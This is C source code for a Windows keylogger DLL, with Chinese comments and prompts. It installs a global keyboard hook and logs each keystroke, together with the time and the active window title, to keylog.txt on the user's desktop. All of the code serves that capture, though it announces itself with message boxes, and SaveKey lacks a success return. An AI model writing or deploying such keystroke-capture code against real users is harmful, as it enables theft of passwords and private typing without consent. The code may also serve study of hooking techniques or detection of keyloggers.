#define EXPORTS
#include "hKey.h"


BOOL InstallHook(){
    // 全局钩子
    g_hook = SetWindowsHookEx(WH_KEYBOARD, keyboardProc, GetModuleHandleA("KeyLog"), 0);
    if (g_hook == NULL) {
        MessageBoxA(NULL, "挂钩安装失败！", "提示", MB_OK);
        ShowError("SetWindowsHookEx");
        return FALSE;
    }
    
    SetSavePath();
    MessageBoxA(NULL, "挂钩安装成功！", "提示", MB_OK);
    return TRUE;
}

BOOL UninstallHook(){
    if (UnhookWindowsHookEx(g_hook)) {
        MessageBoxA(NULL, "挂钩卸载成功！", "提示", MB_OK);
        return TRUE;
    }
    MessageBoxA(NULL, "挂钩卸载失败！", "提示", MB_OK);
    ShowError("UnhookWindowsHookEx");
    return FALSE;
}

LRESULT keyboardProc(int ncode, WPARAM wParam, LPARAM lParam){
    // 记录键盘
    if (ncode < 0 || ncode == HC_NOREMOVE)
        return CallNextHookEx(g_hook, ncode, wParam, lParam);

    // 按键抬起时
    if (lParam & 0x40000000) 
        return CallNextHookEx(g_hook, ncode, wParam, lParam);
    
    // 获取输入
    char szKeyName[50] = { 0 };
    GetKeyNameTextA(lParam, szKeyName, 50);

    // 记录输入
    if (SaveKey(szKeyName) == FALSE)
        return CallNextHookEx(g_hook, ncode, wParam, lParam);

    return CallNextHookEx(g_hook, ncode, wParam, lParam);
}

VOID SetSavePath(){
    // 获取桌面路径
    char DesktopPath[MAX_PATH];
    SHGetSpecialFolderPathA(NULL, DesktopPath, CSIDL_DESKTOP, FALSE);
    sprintf_s(LogFilePath, MAX_PATH, "%s/keylog.txt", DesktopPath);
}

BOOL SaveKey(const char* KeyName) {
    FILE* fp = NULL;
    fopen_s(&fp, LogFilePath, "a");
    if(fp == NULL)
        return FALSE;

    // 获取系统时间
    char sTime[50];
    SYSTEMTIME LT;
    GetLocalTime(&LT);
    sprintf_s(sTime, 50, "%4u-%02u-%02u %02u:%02u", 
        LT.wYear, LT.wMonth, LT.wDay, LT.wHour, LT.wMinute);

    // 获取顶层窗口标题
    char sTitle[256] = { 0 };
    HWND hForegroundWnd = GetForegroundWindow();
    GetWindowTextA(hForegroundWnd, sTitle, 256);

    // 写入文件
    char KeyMsg[256] = { 0 };
    sprintf_s(KeyMsg, 256, "[%s]-[%s]-[%s]\n", sTime, sTitle, KeyName);
    fwrite(KeyMsg, sizeof(char), strlen(KeyMsg), fp);
    fclose(fp);
}

VOID ShowError(const char* FuncName) {
    // 获取错误信息
    char msg[256] = { 0 };
    sprintf_s(msg, 256, "[Error - %s]:\t%u", FuncName, GetLastError());
    MessageBoxA(NULL, msg, "错误", MB_OK);
}